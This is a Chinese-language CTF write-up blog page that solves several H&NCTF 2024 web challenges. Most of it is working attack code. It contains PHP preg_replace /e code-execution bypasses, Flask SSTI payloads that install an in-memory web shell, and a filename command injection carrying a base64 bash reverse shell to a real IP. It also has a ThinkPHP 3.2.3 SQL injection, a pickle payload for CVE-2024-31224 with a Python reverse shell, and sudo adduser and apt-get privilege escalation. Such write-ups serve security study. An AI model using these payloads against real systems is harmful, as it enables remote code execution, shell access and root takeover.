<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>【Web】H&amp;NCTF 2024 题解(部分) - 编程大咖</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:url" content="https://bcdaka.github.io/posts/004088f2e752e6a9eb577814aa2312c4/">
  <meta property="og:site_name" content="编程大咖">
  <meta property="og:title" content="【Web】H&NCTF 2024 题解(部分)">
  <meta property="og:description" content="目录
Please_RCE_Me
ezFlask
GoJava ez_tp
GPTS
Please_RCE_Me &lt;?php if($_GET[&#39;moran&#39;] === &#39;flag&#39;){ highlight_file(__FILE__); if(isset($_POST[&#39;task&#39;])&amp;&amp;isset($_POST[&#39;flag&#39;])){ $str1 = $_POST[&#39;task&#39;]; $str2 = $_POST[&#39;flag&#39;]; if(preg_match(&#39;/system|eval|assert|call|create|preg|sort|{|}|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#39;,$str1) || strlen($str2) != 19 || preg_match(&#39;/please_give_me_flag/&#39;,$str2)){ die(&#39;hacker!&#39;); }else{ preg_replace(&#34;/please_give_me_flag/ei&#34;,$_POST[&#39;task&#39;],$_POST[&#39;flag&#39;]); } } }else{ echo &#34;moran want a flag.&lt;/br&gt;(?moran=flag)&#34;; } preg_replace() /e代码执行漏洞-CSDN博客
正则开启了大小写匹配，可以大小写绕过
黑名单ban得有点多，建议直接转接绕过
task=$_POST[1]($_POST[2]);&amp;flag=Please_give_me_flag&amp;1=system&amp;2=tac /f* 或者读文件
在线16进制字符串转换工具 - 在线工具网
task=var_dump(file_get_contents(hex2bin(&#34;2f666c6167&#34;)));&amp;flag=Please_give_me_flag ezFlask 无回显，想着打flask内存马
新版FLASK下python内存马的研究
flask_memory_shell/README.md at main · iceyhexman/flask_memory_shell · GitHub
一种payload:
cmd=render_template_string(&#34;{{url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](\&#34;app.add_url_rule(&#39;/shell&#39;, &#39;myshell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;)).read())\&#34;,{&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]})}}&#34;) /shell?cmd=grep&#43;-rl&#43;&#34;flag{&#34;&#43;/etc /shell?cmd=cat&#43;/etc/jaygalf 另一种payload:
cmd=__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#39;os&#39;).">
  <meta property="og:locale" content="zh_CN">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-05-14T19:35:23+08:00">
    <meta property="article:modified_time" content="2024-05-14T19:35:23+08:00">

	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
  


</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大咖" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大咖</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">【Web】H&amp;NCTF 2024 题解(部分)</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p id="main-toc"><strong>目录</strong></p> 
<p id="Please_RCE_Me-toc" style="margin-left:0px;"><a href="#Please_RCE_Me" rel="nofollow">Please_RCE_Me</a></p> 
<p id="ezFlask-toc" style="margin-left:0px;"><a href="#ezFlask" rel="nofollow">ezFlask</a></p> 
<p id="GoJava%C2%A0-toc" style="margin-left:0px;"><a href="#GoJava%C2%A0" rel="nofollow">GoJava </a></p> 
<p id="ez_tp-toc" style="margin-left:0px;"><a href="#ez_tp" rel="nofollow">ez_tp</a></p> 
<p id="GPTS-toc" style="margin-left:0px;"><a href="#GPTS" rel="nofollow">GPTS</a></p> 
<hr id="hr-toc"> 
<p></p> 
<h2 id="Please_RCE_Me">Please_RCE_Me</h2> 
<pre><code>&lt;?php
if($_GET['moran'] === 'flag'){
    highlight_file(__FILE__);
    if(isset($_POST['task'])&amp;&amp;isset($_POST['flag'])){
        $str1 = $_POST['task'];
        $str2 = $_POST['flag'];
        if(preg_match('/system|eval|assert|call|create|preg|sort|{|}|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i',$str1) || strlen($str2) != 19 || preg_match('/please_give_me_flag/',$str2)){
            die('hacker!');
        }else{
            preg_replace("/please_give_me_flag/ei",$_POST['task'],$_POST['flag']);
        }
    }
}else{
    echo "moran want a flag.&lt;/br&gt;(?moran=flag)";
}</code></pre> 
<p><a href="https://blog.csdn.net/weixin_43749601/article/details/113417093" title="preg_replace() /e代码执行漏洞-CSDN博客">preg_replace() /e代码执行漏洞-CSDN博客</a></p> 
<p>正则开启了大小写匹配，可以大小写绕过</p> 
<p>黑名单ban得有点多，建议直接转接绕过</p> 
<pre><code>task=$_POST[1]($_POST[2]);&amp;flag=Please_give_me_flag&amp;1=system&amp;2=tac /f*</code></pre> 
<p><img alt="" height="516" src="https://images2.imgbox.com/e2/94/JCA4NjDM_o.png" width="913"></p> 
<p> 或者读文件</p> 
<p><a href="https://tool.hiofd.com/hex-convert-string-online/" rel="nofollow" title="在线16进制字符串转换工具 - 在线工具网">在线16进制字符串转换工具 - 在线工具网</a></p> 
<pre><code>task=var_dump(file_get_contents(hex2bin("2f666c6167")));&amp;flag=Please_give_me_flag</code></pre> 
<p><img alt="" height="562" src="https://images2.imgbox.com/6f/5b/qbclKJN2_o.png" width="953"></p> 
<p></p> 
<p></p> 
<h2 id="ezFlask">ezFlask</h2> 
<p><img alt="" height="147" src="https://images2.imgbox.com/28/44/a5pT4197_o.png" width="595"></p> 
<p>无回显，想着打flask内存马</p> 
<p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936" rel="nofollow" title="新版FLASK下python内存马的研究">新版FLASK下python内存马的研究</a></p> 
<p><a href="https://github.com/iceyhexman/flask_memory_shell/blob/main/README.md" title="flask_memory_shell/README.md at main · iceyhexman/flask_memory_shell · GitHub">flask_memory_shell/README.md at main · iceyhexman/flask_memory_shell · GitHub</a></p> 
<p></p> 
<p>一种payload:</p> 
<pre><code>cmd=render_template_string("{<!-- -->{url_for.__globals__['__builtins__']['eval'](\"app.add_url_rule('/shell', 'myshell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd')).read())\",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})}}")</code></pre> 
<p><img alt="" height="495" src="https://images2.imgbox.com/eb/d3/WzSjr2nx_o.png" width="919"></p> 
<pre><code>/shell?cmd=grep+-rl+"flag{"+/etc</code></pre> 
<p><img alt="" height="353" src="https://images2.imgbox.com/e6/1f/O5g4Afp3_o.png" width="969"></p> 
<pre><code>/shell?cmd=cat+/etc/jaygalf</code></pre> 
<p><img alt="" height="379" src="https://images2.imgbox.com/18/67/Cflbsgz8_o.png" width="959"></p> 
<p></p> 
<p>另一种payload:</p> 
<pre><code>cmd=__import__('sys').modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None,[]).append(lambda :__import__('os').popen('cat /etc/jaygalf ').read())</code></pre> 
<p> <img alt="" height="835" src="https://images2.imgbox.com/64/e7/i82Gzcf8_o.png" width="955"></p> 
<p></p> 
<h2 id="GoJava%C2%A0" style="background-color:transparent;">GoJava </h2> 
<p><img alt="" height="122" src="https://images2.imgbox.com/3b/72/rDqkoA4r_o.png" width="693"></p> 
<p>访问./robots.txt </p> 
<p><img alt="" height="199" src="https://images2.imgbox.com/ba/0a/8Ci26HDM_o.png" width="435"></p> 
<p> ./main.go是403访问./main-old.zip下载附件</p> 
<p>可以看到对文件名做了一定的waf</p> 
<p><img alt="" height="559" src="https://images2.imgbox.com/e1/ee/zdkdmKRl_o.png" width="792"></p> 
<p>题目是对java文件进行编译操作，就是系统命令执行javac拼接文件名</p> 
<pre><code>1.java;echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIyLjEzNi4zMy8xMzM3IDA+JjEi | base64 -d | bash;1.java</code></pre> 
<p>不难想到可以在文件名处进行可以恶意命令拼接</p> 
<p><img alt="" height="414" src="https://images2.imgbox.com/3e/ea/1os1FEms_o.png" width="970"></p> 
<p>成功反弹shell</p> 
<p><img alt="" height="123" src="https://images2.imgbox.com/79/57/Yt1bRiUH_o.png" width="495"></p> 
<p> <img alt="" height="304" src="https://images2.imgbox.com/23/38/03DwLt17_o.png" width="457"></p> 
<p>查看备忘录文件，用该密码成功su root </p> 
<p><img alt="" height="154" src="https://images2.imgbox.com/0c/2c/MjN2raXG_o.png" width="388"></p> 
<p>读flag</p> 
<p><img alt="" height="108" src="https://images2.imgbox.com/6f/56/aSbNlIz6_o.png" width="302"></p> 
<p></p> 
<p></p> 
<h2 id="ez_tp" style="background-color:transparent;">ez_tp</h2> 
<p>下载附件，看到tp版本是3.2.3</p> 
<p><img alt="" height="152" src="https://images2.imgbox.com/e0/9b/G83wD819_o.png" width="925"></p> 
<p>结合源码，能看出考的是sql注入 </p> 
<p><img alt="" height="574" src="https://images2.imgbox.com/7e/4c/kkdzTfNe_o.png" width="815"></p> 
<p><img alt="" height="152" src="https://images2.imgbox.com/a3/6c/0Y6RmGdz_o.png" width="763"></p> 
<p><a href="https://blog.csdn.net/rfrder/article/details/114024426" title="thinkphp3.2.3 SQL注入漏洞复现_thinkphp3.2.3漏洞利用-CSDN博客">thinkphp3.2.3 SQL注入漏洞复现_thinkphp3.2.3漏洞利用-CSDN博客</a> </p> 
<p>payload:</p> 
<pre><code class="hljs">/index.php/home/index/h_n?name[0]=exp&amp;name[1]==-1 union select 1,flag from flag</code></pre> 
<p><img alt="" height="175" src="https://images2.imgbox.com/07/0b/7YtmLdxp_o.png" width="1095"> </p> 
<h2 id="GPTS" style="background-color:transparent;">GPTS</h2> 
<p><img alt="" height="183" src="https://images2.imgbox.com/b2/7a/r1QGI8IZ_o.png" width="394"></p> 
<p>这种gpt题，一般都是搜的新trick</p> 
<p><img alt="" height="880" src="https://images2.imgbox.com/75/fc/3fItBRq8_o.png" width="1200"></p> 
<p><img alt="" height="346" src="https://images2.imgbox.com/f5/6d/c0iiTCXh_o.png" width="906"></p> 
<p><a href="https://xz.aliyun.com/t/14283" rel="nofollow" title="CVE-2024-31224 RCE 分析">CVE-2024-31224 RCE 分析</a> </p> 
<p>按照博客里去复现就可，把弹计算器换成反弹shell</p> 
<pre><code class="hljs">import base64

opcode = b'''cos
system
(S'bash -c "{echo,cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTI0LjIyMi4xMzYuMzMiLDEzMzcpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtwdHkuc3Bhd24oImJhc2giKSc=}|{base64,-d}|{bash,-i}"'
tR.'''
opcode = base64.b64encode(opcode).decode("utf-8")
print(opcode)</code></pre> 
<p>成功反弹shell </p> 
<p><img alt="" height="83" src="https://images2.imgbox.com/b1/86/1qASt7pa_o.png" width="308"></p> 
<p> 查找由用户 <code>ctfgame</code> 拥有并且对其可读的所有文件</p> 
<pre><code class="hljs">find / -type f -user ctfgame -readable 2&gt;/dev/null</code></pre> 
<p> <img alt="" height="118" src="https://images2.imgbox.com/00/ee/yUlSSxOy_o.png" width="534"></p> 
<p>查看/var/mail/ctfgame，读邮件中的敏感信息</p> 
<p><img alt="" height="179" src="https://images2.imgbox.com/da/2a/a1OCIAB0_o.png" width="766"></p> 
<p>切换到ctfer登录</p> 
<p><img alt="" height="114" src="https://images2.imgbox.com/ce/ae/eLycHvX2_o.png" width="370"></p> 
<p>没权限看/etc/sudoers ，用sudo -l</p> 
<pre><code class="hljs">sudo -l  </code></pre> 
<p> <img alt="" height="181" src="https://images2.imgbox.com/2c/c5/dvCqHPGy_o.png" width="501"></p> 
<p>这段回显表明用户 <code>ctfer</code> 在主机 <code>hnctf-01hxryr832qjjc3astkt4rw4dw</code> 上具有以 <code>root</code> 用户身份执行 <code>/usr/sbin/adduser</code> 命令的特权，而且无需输入密码，但被限制不能以 <code>sudo</code> 用户或 <code>admin</code> 用户身份执行该命令。</p> 
<blockquote> 
 <p><code>/usr/sbin/adduser</code> 是一个方便的命令行工具，用于在 Linux 系统中管理用户账户。 </p> 
</blockquote> 
<p> 添加一个root组用户</p> 
<pre><code class="hljs">sudo adduser test -gid=0</code></pre> 
<p><img alt="" height="462" src="https://images2.imgbox.com/e8/b2/FzYMnMHm_o.png" width="436"> </p> 
<p>以root组用户test登录</p> 
<p><img alt="" height="103" src="https://images2.imgbox.com/bc/42/dH45M60b_o.png" width="388"> </p> 
<pre><code class="hljs">cat /etc/sudoers</code></pre> 
<p><img alt="" height="71" src="https://images2.imgbox.com/2d/89/tmLR01Mc_o.png" width="626"> </p> 
<p>看到kobe，可以apt-get提权</p> 
<p>现在我们要以kobe身份登录</p> 
<p>先切回ctfer，sudo adduser kobe创建一个kobe用户</p> 
<pre><code class="hljs">sudo adduser kobe</code></pre> 
<p>再以kobe身份登录，apt-get提权</p> 
<p><a href="https://lzcloudsecurity.gitbook.io/yun-an-quan-gong-fang-ru-men/di-er-zhang-linux-gong-fang-kuai-su-ru-men-shang/sudo-shou-quan-yu-ti-quan" rel="nofollow" title="SUDO授权与提权 | 云安全攻防入门">SUDO授权与提权 | 云安全攻防入门</a></p> 
<pre><code class="hljs">sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash -i"</code></pre> 
<p><img alt="" height="294" src="https://images2.imgbox.com/da/fc/ZHXxeIyQ_o.png" width="709"></p> 
<pre><code class="hljs">cat /root/f*/f*</code></pre> 
<p> 拿到flag</p> 
<p><img alt="" height="63" src="https://images2.imgbox.com/8f/f3/mvChQ4jC_o.png" width="407"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/42bd2efbf4aa10ad4befdd0df95ab86e/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">AI模型：windows本地运行下载安装ollama运行llama3、llama2、Google CodeGemma、gemma等可离线运行数据模型【自留记录】</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/57ff872fd6400afb05c6753a2a739504/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">vue前端获取 切换麦克风，播放采集音频和采集音量大小_vue页面唤起麦克风</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大咖.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>